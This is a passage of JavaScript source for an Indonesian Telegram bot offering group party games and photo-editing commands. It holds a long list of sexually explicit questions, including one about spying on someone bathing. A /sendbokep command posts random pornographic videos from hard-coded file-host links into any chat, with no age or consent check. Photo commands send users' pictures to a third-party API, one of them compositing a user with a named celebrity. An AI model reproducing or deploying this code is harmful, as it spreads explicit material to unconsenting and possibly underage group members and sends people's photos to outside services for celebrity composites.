    "Pernah ga kepergok buka bokep pas lagi sekolah/kampus? 📚",
    "Kalau harus pilih: coli tanpa suara atau coli sambil nyanyi dangdut? 🎶🤣",
    "Lebih milih tidur bareng temen mesum atau tidur sendirian di kuburan? 👻",
    "Kalau semua chat mesummu dipublish, siapa yang paling malu? 📲",
    "Pernah ga colinya pake barang aneh? Ceritain yang paling unik 🤣",
    "Kalau ada CCTV di kamar kamu, kira-kira berapa kali ketahuan coli seminggu? 📹",
    "Lebih milih ketahuan bokep history atau galeri penuh meme bokep? 😂",
    "Kalau harus pilih: nonton bokep di kelas atau di masjid? 😱",
    "Pernah ga colinya sampe ketiduran? 😴",
    "Kalau emakmu tiba-tiba masuk kamar, apa trikmu nutupin biar ga ketahuan? 🚪",
    "Kalau ada penghargaan 'raja coli', kira-kira kamu dapet peringkat berapa? 🏅",
    "Siapa di grup ini yang kayaknya diam-diam doyan bokep? 🤫",
    "Kalau bokep harus bayar tiap nonton, kira-kira kamu tekor berapa per bulan? 💳",
    "Pernah ga salah sebut nama artis bokep pas lagi ngobrol biasa? 😂",
    "Kalau harus pilih: coli tiap hari atau seks seminggu sekali? 🤔",
    "Kalau pacar/gebetanmu minta share history browser, berani kasih ga? 😅",
    "Pernah ga colinya pake imajinasi sama orang deket? 😳",
    "Kalau ada bot penghitung coli, kira-kira kamu udah berapa ribu kali? 📟",
    "Lebih milih ketahuan bokep sama adik atau sama bapak? 👀",
    "Kalau semua grup WA kamu dicek, grup mana yang paling mesum? 📱",
    "Siapa karakter game yang pernah bikin kamu mikir jorok? 🎮",
    "Pernah ga colinya di tempat ga wajar? (contoh: atap, kebun, sekolah) 🤣",
    "Kalau emakmu tau username twitter mesummu, gimana reaksi dia? 🐦",
    "Kalau ada sensor di tangan, kira-kira udah nyala berapa kali seminggu? 🔥",
    "Lebih milih coli pake sabun cair atau pake lotion? 🧴",
    "Pernah ga nonton bokep bareng temen? Reaksinya gimana? 😂",
    "Kalau harus pilih: coli di toilet pesawat atau di toilet kampus? ✈️🏫",
    "Siapa di grup ini yang paling kamu curigai punya folder rahasia bokep? 📂",
    "Kalau bot ini bisa kasih ranking 'tangan terkuat', kira-kira kamu juara ga? ✊",
    "Pernah ga ketiduran pas lagi nonton bokep? 📺",
    "Kalau emakmu nemuin file bokep, alasan apa yang kamu kasih? 🥴",
    "Kalau kamu harus ganti nama jadi nama artis bokep, pilih siapa? 🌟",
    "Lebih milih coli di siang bolong atau tengah malam? 🌞🌙",
    "Kalau ada aplikasi tracking coli, kira-kira notifikasimu sering bunyi ga? 📲",
    "Pernah ga kepikiran bokep pas lagi sholat/ibadah? 😬",
    "Kalau semua pikiran mesummu diputar di layar bioskop, siapa yang paling kamu takutin nonton? 🎬",
    "Kalau bokep dilarang seumur hidup, kira-kira kamu bisa survive ga? 🚫",
    "Siapa artis Indo yang paling sering masuk mimpi basahmu? 🇮🇩",
    "Pernah ga ketahuan buka bokep sama temen deket? Gimana reaksinya? 😂",
    "Kalau harus pilih: coli di kamar mandi umum atau di perpustakaan? 🏛️",
    "Lebih milih nyimpen bokep di laptop atau di HP? 💻📱",
    "Kalau emakmu tau seberapa banyak kuota habis buat bokep, kira-kira ngomel ga? 📶",
    "Pernah ga download bokep terus lupa hapus, ke-detect orang lain? 😱",
    "Kalau ada kartu member premium coli, kamu mau daftar ga? 💳",
    "Kalau semua orang tau fantasi nakalmu, siapa yang bakal ngejauh duluan? 😅",
    "Pernah ga ngaca sambil coli? 🤣",
    "Kalau bot ini bisa kasih prediksi umur, umur berapa kamu pensiun coli? ⏳",
    "Lebih milih coli 5x sehari atau ga coli sama sekali setahun? 🤯",
    "Kalau emakmu tau username IG fake mesummu, kira-kira gimana? 📸",
    "Pernah ga ketahuan colinya sama hewan peliharaanmu? 🐶🐱",
    "Kalau harus pilih: coli di kamar mandi kos atau di rooftop kos? 🏢",
    "Kalau semua riwayat colimu ditulis di buku, berapa jilid? 📚",
    "Kalau bokep jadi mata pelajaran sekolah, kira-kira nilai kamu A+ ga? 🅰️",
    "Siapa di grup ini yang paling cocok jadi duta bokep? 🤣",
    "Kalau kamu punya mesin waktu, siapa orang pertama yang pengen kamu intip pas lagi mandi? ⏳🚿"
  ];

  const randomQ = pertanyaan[Math.floor(Math.random() * pertanyaan.length)];

  const text =
    `🧠 *Game Tebak Pikiran Luu* 🧠\n\n` +
    `${fromUser}, jawab jujur ya!\n\n` +
    `👉 ${randomQ}`;

  await bot.sendMessage(chatId, text, {
    parse_mode: "Markdown",
  });
});

// === HANDLER NODE-TELEGRAM-BOT-API ===

function generateDeath(userId) {
  const reasons = [
    "Kecelakaan",
    "Penyakit",
    "Tersedak bakso",
    "Disambar petir",
    "Tua"
  ];

  const age = Math.floor(Math.random() * 60) + 20;
  const daysLeft = Math.floor(Math.random() * 20000) + 1;

  const death = new Date();
  death.setDate(death.getDate() + daysLeft);

  return {
    death,
    age,
    daysLeft,
    reason: reasons[Math.floor(Math.random() * reasons.length)]
  };
}

bot.onText(/\/cekmati(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;

  const { death, age, daysLeft, reason } = generateDeath(user.id);

  const fullName = [user.first_name, user.last_name].filter(Boolean).join(" ");

  const text =
    `🔮 *Ramalan Kematian Kamu*\n\n` +
    `👤 Nama: _${fullName}_\n` +
    `📅 Tanggal: *${death.toISOString().split("T")[0]}*\n` +
    `⌛ Umur saat meninggal: *${age} tahun*\n` +
    `📆 Sisa hari: *${daysLeft} hari*\n\n` +
    `💀 Penyebab: _${reason}_\n\n` +
    `_Disclaimer: ini cuma hiburan, jangan dipercaya beneran ya 😜_`;

  await bot.sendMessage(chatId, text, {
    parse_mode: "Markdown",
  });
});
// Ambil user random dari admin grup (non-bot)
async function getRandomMember(chatId) {
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const users = admins
      .map(a => a.user)
      .filter(u => !u.is_bot);

    if (users.length === 0) return null;

    return users[Math.floor(Math.random() * users.length)];
  } catch (err) {
    console.error(err);
    return null;
  }
}

// ================= GAME HARUS JUJUR 3X (node-telegram-bot-api) =================
const pertanyaanJujur = [
  // Pertanyaan tentang perasaan
  "Siapa orang yang diam-diam kamu suka sekarang? 😳",
  "Pernah suka sama sahabat sendiri? 🤔",
  "Siapa mantan yang paling bikin kamu nyesel? 🥲",
  "Kalau disuruh balikan sama mantan, siapa yang kamu pilih? ❤️",
  "Siapa orang yang paling sering bikin kamu baper? 🥺",

  // Pertanyaan lucu & kocak
  "Kapan terakhir kali kamu kentut keras-keras? 💨😂",
  "Pernah pura-pura tidur biar gak diganggu? 😴",
  "Pernah pura-pura sakit biar bolos sekolah/kerja? 🛌",
  "Kapan terakhir kali kamu bohong bilang 'OTW' padahal masih di rumah? 🏠🤣",
  "Pernah ngupil terus ditempel di bawah meja? 🤣",

  // Pertanyaan sehari-hari
  "Kapan terakhir kali kamu mandi? 🛁",
  "Siapa yang paling ngeselin di grup ini menurutmu? 😆",
  "Siapa yang paling sering bikin kamu ketawa? 😂",
  "Kapan terakhir kali kamu nangis diam-diam? 😢",
  "Siapa yang sering kamu kepoin diam-diam? 👀",

  // Pertanyaan tentang rahasia kecil
  "Pernah ngintip chat orang lain diam-diam? 📱",
  "Pernah stalk mantan sampai kepo banget? 🕵️‍♂️",
  "Pernah suka sama guru/dosen? 📚",
  "Pernah pura-pura sibuk biar gak bales chat siapa? 📲",
  "Pernah curi-curi tidur di kelas/kerja? 😴",

  // Pertanyaan agak malu-malu
  "Siapa orang terakhir yang bikin kamu senyum sendiri? 🤭",
  "Pernah bohong ke orang tua? 🤔",
  "Siapa yang kamu kangenin banget sekarang? 🥺",
  "Pernah bohong ke pacar/gebetan? 😬",
  "Pernah suka sama pacar orang? 😏",

  // Pertanyaan pilihan kocak
  "Pilih mana: kehilangan HP atau kehilangan pacar? 📱❤️",
  "Kalau dikasih 1 miliar atau balikan sama mantan, pilih mana? 💸😂",
  "Kalau disuruh pilih, kamu mending jomblo seumur hidup atau nggak bisa makan mie instan lagi? 🍜🤣",
  "Pilih mana: tidur 12 jam sehari atau nggak tidur sama sekali 2 hari? 🛌☕",
  "Kalau disuruh milih, kamu mending lupa sama semua orang atau semua orang lupa sama kamu? 🧠❓",

  // Pertanyaan ngakak random
  "Pernah makan mie instan pake nasi? 🍜🍚",
  "Kapan terakhir kali kamu ketahuan bohong? 😅",
  "Pernah ketiduran sambil video call? 📞😴",
  "Pernah ke WC umum terus lupa bawa tisu? 🚽🤣",
  "Kalau kamu jadi presiden, hal konyol apa yang bakal kamu bikin? 👑😂",
];

// Simpan state game per user-per-chat
// key: `${chatId}:${userId}` => { count, awaitingAnswer }
const truthGames = {};

// Fungsi bantu: kirim pertanyaan
function kirimPertanyaan(chatId, userId) {
  const key = `${chatId}:${userId}`;
  const game = truthGames[key];
  if (!game) return;

  if (game.count >= 3) {
    bot.sendMessage(chatId, "✅ Terima kasih sudah menjawab pertanyaanku 🙏🤣");
    delete truthGames[key];
    return;
  }

  const random =
    pertanyaanJujur[Math.floor(Math.random() * pertanyaanJujur.length)];

  bot.sendMessage(
    chatId,
    `🎮 *Game Harus Jujur Ngakak* 🎮\n\n` +
      `Pertanyaan ${game.count + 1}:\n👉 ${random}\n\n` +
      `_Jawab dengan jujur ya! 🤣_`,
    { parse_mode: "Markdown" }
  );

  game.awaitingAnswer = true;
}

// Command /teskejujuran
bot.onText(/\/teskejujuran(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const key = `${chatId}:${userId}`;

  truthGames[key] = {
    count: 0,
    awaitingAnswer: false,
  };

  kirimPertanyaan(chatId, userId);
});

// Listener jawaban user
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Hanya respon pesan text biasa
  if (!msg.text) return;

  // Abaikan kalau ini command lain (biar ga keitung jawaban)
  if (msg.text.startsWith("/")) return;

  const key = `${chatId}:${userId}`;
  const game = truthGames[key];

  if (!game) return;
  if (!game.awaitingAnswer) return;

  // Jawaban user
  bot.sendMessage(chatId, `🤣 Jawaban kamu: "${msg.text}"`);

  game.count++;
  game.awaitingAnswer = false;

  // Kirim pertanyaan berikutnya
  kirimPertanyaan(chatId, userId);
});
// ===== Game Tebak Bom Grup (node-telegram-bot-api) =====
const groupGames = {}; // Simpan game per grup

// Helper: SELALU pakai @username
function tagUser(player) {
  return `@${player.username}`;
}

// Helper: generate posisi bom unik
function generateBombs(totalKotak, jumlahBom) {
  const set = new Set();
  while (set.size < jumlahBom) {
    const pos = Math.floor(Math.random() * totalKotak) + 1; // 1..totalKotak
    set.add(pos);
  }
  return Array.from(set);
}

// Helper: render papan (angka / ✅ / 💥)
function getDisplayBoard(game) {
  return game.kotakStatus
    .map((status, idx) => {
      const num = idx + 1;
      if (status === "closed") return String(num); // kotak belum dibuka → angka
      if (status === "safe") return "✅";
      if (status === "bomb") return "💥";
    })
    .join(" ");
}

// /startbom - Mulai pendaftaran game
bot.onText(/\/startbom(?:@\w+)?/, (msg) => {
  const chat = msg.chat;
  if (!chat || (chat.type !== "group" && chat.type !== "supergroup")) {
    return bot.sendMessage(chat.id, "❌ Game hanya bisa dimainkan di grup.");
  }

  const chatId = chat.id;

  if (groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "⚠️ Game sedang berlangsung di grup ini. Ketik /resetbom untuk reset."
    );
  }

  const jumlahKotak = 50;
  const jumlahBom = 13;

  groupGames[chatId] = {
    hostId: msg.from.id,                   // yang start, hanya dia yg boleh reset
    hostUsername: msg.from.username || null,
    players: [],                           // pemain yang masih hidup
    started: false,
    currentTurn: 0,
    jumlahKotak,
    bombs: generateBombs(jumlahKotak, jumlahBom), // array posisi bom
    kotakStatus: Array(jumlahKotak).fill("closed"), // "closed" | "safe" | "bomb"
    eliminated: [],                        // pemain yang sudah kena bom
    eliminationOrder: 0,                   // counter urutan kena bom
  };

  bot.sendMessage(
    chatId,
    "🎮 *Game Tebak Bom Dimulai!*\n\n" +
      "Ketik `/daftar` untuk ikut bermain.\n" +
      "Minimal 5 pemain, maksimal 10 pemain.\n" +
      "Admin ketik `/mulai` untuk memulai game.\n\n" +
      "⚠️ Wajib punya username Telegram (@username) untuk ikut.\n" +
      "⚠️ Hanya yang mengetik /startbom pertama kali yang bisa /resetbom.\n" +
      "⚠️ Kotak 1–50, tersebar 13 bom acak.",
    { parse_mode: "Markdown" }
  );
});

// /daftar - Pendaftaran pemain
bot.onText(/\/daftar(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username; // WAJIB ada

  if (!groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada game. Ketik /startbom untuk mulai pendaftaran."
    );
  }

  const game = groupGames[chatId];

  if (game.started) {
    return bot.sendMessage(
      chatId,
      "⚠️ Pendaftaran sudah ditutup. Game sedang berlangsung."
    );
  }

  if (!username) {
    return bot.sendMessage(
      chatId,
      "⚠️ Kamu harus punya username Telegram (@...) dulu untuk ikut game.\n" +
      "Silakan set di *Pengaturan ➜ Username*, lalu daftar lagi.",
      { parse_mode: "Markdown" }
    );
  }

  if (game.players.find((p) => p.id === userId)) {
    return bot.sendMessage(chatId, "⚠️ Kamu sudah terdaftar.");
  }

  if (game.players.length >= 10) {
    return bot.sendMessage(
      chatId,
      "⚠️ Pendaftaran penuh (maksimal 10 pemain)."
    );
  }

  game.players.push({
    id: userId,
    name: msg.from.first_name || "Pemain",
    username: username, // dipastikan ada
  });

  bot.sendMessage(
    chatId,
    `✅ @${username} berhasil daftar! (Total pemain: ${game.players.length}/10)`
  );
});

// /mulai - Mulai game setelah pendaftaran
bot.onText(/\/mulai(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;

  if (!groupGames[chatId]) {
    return bot.sendMessage(chatId, "❌ Belum ada game. Ketik /startbom untuk mulai.");
  }

  const game = groupGames[chatId];

  if (game.players.length < 5) {
    return bot.sendMessage(chatId, "⚠️ Minimal 5 pemain untuk memulai game.");
  }

  game.started = true;
  game.currentTurn = 0;

  const board = getDisplayBoard(game);
  bot.sendMessage(
    chatId,
    `🎲 Game dimulai!\n` +
      `Pemain terdaftar: ${game.players.map((p) => tagUser(p)).join(", ")}\n\n` +
      `${board}\n\n` +
      `👉 Giliran: ${tagUser(game.players[0])}\n` +
      `Pilih kotak dengan /pilih <nomor> (1-50)`
  );
});

// Helper: kirim hasil akhir / peringkat
function kirimPeringkatAkhir(bot, chatId, game, adaPemenang, winner) {
  let judul;
  if (adaPemenang) {
    judul = "🏆 *Hasil Akhir Game Tebak Bom* (Ada Pemenang)\n\n";
  } else {
    judul = "💀 *Hasil Akhir Game Tebak Bom* (Tidak Ada Pemenang)\n\n";
  }

  let ranking = [];

  if (adaPemenang && winner) {
    ranking.push(winner); // pemenang di posisi 1
  }

  // Urutkan yang kena bom dari paling lama bertahan ke paling cepat meledak
  const eliminatedSorted = [...game.eliminated].sort(
    (a, b) => b.eliminatedAt - a.eliminatedAt
  );

  ranking = adaPemenang ? [winner, ...eliminatedSorted] : eliminatedSorted;

  let text = judul;
  ranking.forEach((p, idx) => {
    const posisi = idx + 1;
    const extra =
      adaPemenang && idx === 0
        ? " 🏆"
        : "";
    text += `${posisi}. ${tagUser(p)}${extra}\n`;
  });

  if (!ranking.length && !adaPemenang) {
    text += "_Tidak ada data peringkat._\n";
  }

  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
}

// /pilih <nomor> - Pemain memilih kotak
bot.onText(/\/pilih(?:@\w+)?(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const pilihan = parseInt(match[1]);

  if (!groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada game aktif. Ketik /startbom untuk mulai."
    );
  }

  const game = groupGames[chatId];

  if (!game.started) {
    return bot.sendMessage(
      chatId,
      "⚠️ Game belum dimulai. Admin ketik /mulai untuk mulai game."
    );
  }

  const currentPlayer = game.players[game.currentTurn];

  if (!currentPlayer || userId !== currentPlayer.id) {
    return bot.sendMessage(
      chatId,
      `⚠️ Sekarang giliran ${currentPlayer ? tagUser(currentPlayer) : "pemain lain"}, bukan kamu!`
    );
  }

  if (isNaN(pilihan) || pilihan < 1 || pilihan > game.jumlahKotak) {
    return bot.sendMessage(
      chatId,
      `⚠️ Masukkan nomor kotak antara 1-${game.jumlahKotak}.`
    );
  }

  // Cek apakah kotak sudah pernah dibuka
  if (game.kotakStatus[pilihan - 1] !== "closed") {
    return bot.sendMessage(
      chatId,
      "⚠️ Kotak ini sudah dibuka, pilih nomor lain."
    );
  }

  // Cek apakah kotak ini bom
  const isBomb = game.bombs.includes(pilihan);

  // ================= LOGIKA BOM =================
  if (isBomb) {
    game.kotakStatus[pilihan - 1] = "bomb";

    const eliminatedPlayer = currentPlayer;

    // Catat urutan kena bom
    game.eliminationOrder += 1;
    game.eliminated.push({
      ...eliminatedPlayer,
      eliminatedAt: game.eliminationOrder,
    });

    // Hapus player yg kena bom dari list players
    game.players.splice(game.currentTurn, 1);

    const boardAfter = getDisplayBoard(game);

    bot.sendMessage(
      chatId,
      `${boardAfter}\n\n💥 BOOM! ${tagUser(
        eliminatedPlayer
      )} kena bom dan *dikeluarkan dari game!*`,
      { parse_mode: "Markdown" }
    );

    // Cek sisa pemain
    if (game.players.length === 1) {
      const winner = game.players[0];

      bot.sendMessage(
        chatId,
        `🏆 Pemenang adalah ${tagUser(winner)}!`
      );

      // Kirim peringkat akhir
      kirimPeringkatAkhir(bot, chatId, game, true, winner);

      delete groupGames[chatId];
      return;
    }

    if (game.players.length === 0) {
      bot.sendMessage(
        chatId,
        "💀 Semua pemain kena bom. Tidak ada pemenang."
      );

      // Kirim peringkat akhir tanpa pemenang
      kirimPeringkatAkhir(bot, chatId, game, false, null);

      delete groupGames[chatId];
      return;
    }

    // Sesuaikan currentTurn jika index keluar dari range
    if (game.currentTurn >= game.players.length) {
      game.currentTurn = 0;
    }

    bot.sendMessage(
      chatId,
      `👉 Giliran berikutnya: ${tagUser(game.players[game.currentTurn])}\n` +
      `👥 Sisa pemain: ${game.players.map(p => tagUser(p)).join(", ")}`
    );

    return;
  }

  // ================= AMAN (BUKAN BOM) =================
  game.kotakStatus[pilihan - 1] = "safe";

  const boardAfterSafe = getDisplayBoard(game);

  bot.sendMessage(
    chatId,
    `${boardAfterSafe}\n\n✅ Aman! ${tagUser(
      currentPlayer
    )} selamat dari bom!`
  );

  // Cek kondisi SERI:
  // kalau semua kotak aman sudah dibuka dan tidak ada yang kena bom sama sekali.
  const closedPositions = [];
  for (let i = 0; i < game.jumlahKotak; i++) {
    if (game.kotakStatus[i] === "closed") {
      closedPositions.push(i + 1); // posisi 1-based
    }
  }

  if (closedPositions.length === 0 && game.eliminated.length === 0) {
    // Secara literal: semua kotak sudah dibuka & tidak ada yang kena bom
    const seriPlayers = game.players.map(p => tagUser(p)).join(", ");
    bot.sendMessage(
      chatId,
      `🤝 Semua kotak sudah dibuka dan *tidak ada yang kena bom*!\n` +
      `Pemain seri: ${seriPlayers}`,
      { parse_mode: "Markdown" }
    );
    delete groupGames[chatId];
    return;
  }

  // Pindah ke giliran berikutnya (circular)
  game.currentTurn = (game.currentTurn + 1) % game.players.length;

  bot.sendMessage(
    chatId,
    `👉 Giliran berikutnya: ${tagUser(game.players[game.currentTurn])}`
  );
});

// /resetbom - Reset game di grup (HANYA host yang boleh)
bot.onText(/\/resetbom(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const game = groupGames[chatId];

  if (!game) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada game untuk direset.");
  }

  if (userId !== game.hostId) {
    return bot.sendMessage(
      chatId,
      `⚠️ Hanya ${game.hostUsername ? `@${game.hostUsername}` : "pembuat game"} yang bisa mereset game ini.`
    );
  }

  delete groupGames[chatId];
  bot.sendMessage(chatId, "🔄 Game berhasil direset oleh pembuat game.");
});

// ======================================================
// 🎥 Daftar link video MP4 (boleh tambahkan sebanyaknya)
// ======================================================
const videoList = [
  "https://files.catbox.moe/3yko44.mp4",
"https://files.catbox.moe/ebisdh.mp4",
"https://files.catbox.moe/85mjwm.mp4",
"https://files.catbox.moe/fxe94h.mp4",
"https://files.catbox.moe/xlbafn.mp4",
"https://files.catbox.moe/eti8qi.mp4",
"https://files.catbox.moe/0728bg.mp4",
"https://files.catbox.moe/6bkokw.mp4",
"https://files.catbox.moe/y4rote.mp4",
"https://files.catbox.moe/svw26n.mp4",
"https://files.catbox.moe/tw6m9q.mp4",
"https://files.catbox.moe/o1ipxw.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/b99qh3.mp4",
"https://files.catbox.moe/o1sq2k.mp4",
"https://files.catbox.moe/zqaszb.mp4",
"https://files.catbox.moe/apqlvo.mp4",
"https://files.catbox.moe/cdl11t.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/8ca9cw.mp4",
"https://files.catbox.moe/52oh63.mp4",
"https://files.catbox.moe/rt62tl.mp4",
"https://files.catbox.moe/occ3en.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/h2w5jl.mp4",
"https://files.catbox.moe/dmbizk.mp4",
"https://files.catbox.moe/3288uf.mp4",
"https://files.catbox.moe/rdggsh.mp4",
"https://files.catbox.moe/1a78ht.mp4",
"https://files.catbox.moe/a537h1.mp4",
"https://files.catbox.moe/n992te.mp4",
"https://files.catbox.moe/gv4087.mp4",
"https://files.catbox.moe/n37liq.mp4",
"https://files.catbox.moe/3g2djb.mp4",
"https://files.catbox.moe/q9f2rs.mp4",
"https://files.catbox.moe/4x09p9.mp4",
"https://files.catbox.moe/83fd5h.mp4",
"https://files.catbox.moe/6di4hn.mp4",
"https://files.catbox.moe/dxn5oj.mp40",
"https://files.catbox.moe/ltdsbm.mp4",
"https://files.catbox.moe/71l6bo.mp4",
"https://files.catbox.moe/uw6qbs.mp40",
"https://files.catbox.moe/0eisok.mp4",
"https://files.catbox.moe/r3ip1j.mp4",
"https://files.catbox.moe/pmyi1y.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/y8hmau.mp4",
"https://files.catbox.moe/wmda7z.mp4",
"https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  // tambahkan link lain di sini
];

// ======================================================
// 🧩 Fitur: /sendbokep
// ======================================================
bot.onText(/\/sendbokep/, async (msg) => {
  const chatId = msg.chat.id;

  if (videoList.length === 0) {
    return bot.sendMessage(chatId, "❌ Belum ada video yang tersedia.");
  }

  // Pilih video secara acak
  const randomIndex = Math.floor(Math.random() * videoList.length);
  const videoUrl = videoList[randomIndex];

  await bot.sendMessage(chatId, "🎬 Mengambil video bokep acak...");
  await bot.sendVideo(chatId, videoUrl, {
    caption: "💦 Video random bokep untukmu!",
  });
});

bot.onText(/\/tofigura/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🖼️ *Kirim foto kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.tofiguraAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tofiguraAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi figur 1/7...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi figur 1/7!"
        });

    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // hapus state
    bot.tofiguraAsk = null;
});

// Mulai perintah
bot.onText(/\/tobersamav2/, async (msg) => {
    const chatId = msg.chat.id;

    const ask1 = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto pertama dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.photo1Ask = ask1.message_id;
});

// Foto pertama
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // ————— Foto Pertama —————
    if (msg.reply_to_message && msg.reply_to_message.message_id === bot.photo1Ask) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileUrl = await bot.getFileLink(fileId);

        bot.url1 = fileUrl;

        const ask2 = await bot.sendMessage(
            chatId,
            "📷 *Kirim foto kedua dengan membalas (reply) pesan ini*",
            { parse_mode: "Markdown" }
        );

        bot.photo2Ask = ask2.message_id;
        return;
    }

    // ————— Foto Kedua —————
    if (msg.reply_to_message && msg.reply_to_message.message_id === bot.photo2Ask) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileUrl = await bot.getFileLink(fileId);

        bot.url2 = fileUrl;

        bot.sendMessage(chatId, "⏳ Sedang memproses kedua foto...");

        try {
            const apiUrl = `https://api-faa.my.id/faa/tobersamav2?url1=${encodeURIComponent(bot.url1)}&url2=${encodeURIComponent(fileUrl)}`;

            const response = await axios({
                url: apiUrl,
                responseType: "arraybuffer"
            });

            const buffer = Buffer.from(response.data, "binary");

            bot.sendPhoto(chatId, buffer, {
                caption: "✨ Foto ToBersama v2 berhasil dibuat!"
            });

        } catch (err) {
            bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses foto.");
        }

        // bersihkan state
        bot.photo1Ask = null;
        bot.photo2Ask = null;
        bot.url1 = null;
        bot.url2 = null;
    }
});

bot.onText(/\/fotbersamav1/, async (msg) => {
    const chatId = msg.chat.id;

    const askPhoto = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan agar nanti dicek reply-nya
    bot.lastAskPhoto = askPhoto.message_id;
});

// Saat user mengirim foto dengan reply
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Cek apakah foto adalah reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.lastAskPhoto) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    // Bot minta nama artis
    const askArtis = await bot.sendMessage(
        chatId,
        "⭐ *Masukkan nama artis dengan membalas (reply) pesan ini*\nContoh: `lisa blackpink`",
        { parse_mode: "Markdown" }
    );

    bot.lastAskArtis = askArtis.message_id;
    bot.userPhotoUrl = fileUrl;
});

// Saat user membalas nama artis
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;

    // Cek reply teks nama artis
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.lastAskArtis) return;
    if (!msg.text || msg.text.startsWith("/")) return;

    const artist = msg.text;
    const photoUrl = bot.userPhotoUrl;

    bot.sendMessage(chatId, `⏳ Sedang memproses foto bersama *${artist}*...`, {
        parse_mode: "Markdown"
    });

    try {
        const apiUrl = `https://api-faa.my.id/faa/tobersama?url=${encodeURIComponent(photoUrl)}&nama-artis=${encodeURIComponent(artist)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
